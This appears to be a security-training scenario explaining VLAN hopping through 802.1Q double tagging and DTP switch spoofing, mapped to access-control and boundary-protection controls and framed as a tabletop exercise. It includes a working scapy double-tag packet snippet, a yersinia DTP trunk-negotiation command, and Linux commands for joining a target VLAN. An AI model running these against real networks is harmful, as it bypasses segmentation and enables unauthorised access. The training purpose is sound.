# AC-3 VLAN Hopping — Break

## Scenario: VLAN Hopping via Double Tagging and Switch Spoofing

An attacker on an access port sends traffic to a VLAN they are not authorized to access, bypassing network segmentation that the security architecture relies on.

## What This Simulates

- Failure of Layer 2 access enforcement between network segments
- Misconfigured trunk ports that accept negotiation from access ports
- Native VLAN misconfigurations that enable double-tagging attacks
- Gap between "VLANs provide segmentation" (design intent) and actual enforcement

## Attack Method 1: Double Tagging (802.1Q)

Double tagging exploits how switches handle the native VLAN. The attacker sends a frame with two 802.1Q tags. The first switch strips the outer tag (matching the native VLAN) and forwards the frame. The second switch reads the inner tag and delivers the frame to the target VLAN.

**Requirements:**
- Attacker must be on the native VLAN (or a port whose native VLAN matches the outer tag)
- Target VLAN must be different from the native VLAN
- Attack is one-directional (attacker can send but not receive replies)

**Steps:**
1. Identify the native VLAN on the trunk port (often VLAN 1, the default)
2. Craft a frame with two 802.1Q headers:
   - Outer tag: native VLAN (e.g., VLAN 1)
   - Inner tag: target VLAN (e.g., VLAN 100 — server VLAN)
3. Send the frame on the access port
4. First switch strips the outer tag (native VLAN, untagged by design)
5. Frame arrives at the next switch with only the inner tag (VLAN 100)
6. Second switch delivers the frame to VLAN 100

**Tool (Linux with scapy):**
```python
from scapy.all import *
# Double-tagged frame: outer VLAN 1 (native), inner VLAN 100 (target)
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
      Dot1Q(vlan=1) / \
      Dot1Q(vlan=100) / \
      IP(dst="10.100.0.1") / \
      ICMP()
sendp(pkt, iface="eth0")
```

## Attack Method 2: Switch Spoofing (DTP Negotiation)

If Dynamic Trunking Protocol (DTP) is enabled on access ports (default on many Cisco switches), an attacker can negotiate a trunk link and gain access to all VLANs.

**Requirements:**
- DTP must be enabled on the access port (default: `dynamic desirable` or `dynamic auto`)
- Attacker sends DTP negotiation frames to establish a trunk

**Steps:**
1. Identify an access port with DTP enabled
2. Use a tool to send DTP negotiation frames:
   ```bash
   # Using yersinia (L2 attack framework)
   yersinia dtp -attack 1 -interface eth0
   ```
3. The switch negotiates a trunk link with the attacker's host
4. Attacker now receives tagged traffic for all VLANs on that trunk
5. Attacker can send traffic to any VLAN

**Tool (yersinia):**
```bash
# Enable trunk negotiation via DTP
yersinia dtp -attack 1 -interface eth0

# Alternatively, manually configure 802.1Q trunking on Linux:
modprobe 8021q
vconfig add eth0 100
ifconfig eth0.100 10.100.0.99 netmask 255.255.255.0 up
```

## What Breaks

- **AC-3 (Access Enforcement)** — unauthorized access to restricted VLAN segments
- **SC-7 (Boundary Protection)** — network segmentation bypassed at L2
- **AC-4 (Information Flow Enforcement)** — traffic flows between segments that should be isolated
- **SC-7(5) (Deny by Default)** — default DTP configuration allows trunk negotiation

## Real-World Examples

- VLAN hopping has been demonstrated at every major security conference since 2005
- Default Cisco switch configurations ship with DTP enabled — a known misconfiguration
- 2020 Dragos report: OT/ICS networks frequently rely on VLANs as the primary segmentation control, making VLAN hopping a path from IT to OT
- The Purdue Model (ICS reference architecture) depends on VLAN integrity for zone separation

## Why This Is a Tabletop

VLAN hopping requires physical switch hardware or a network emulator (GNS3/EVE-NG) to demonstrate properly. The attack depends on switch ASIC behavior that cannot be replicated with Linux bridges or virtual switches. In a lab environment, this scenario is walked through as a tabletop exercise with switch configuration review.
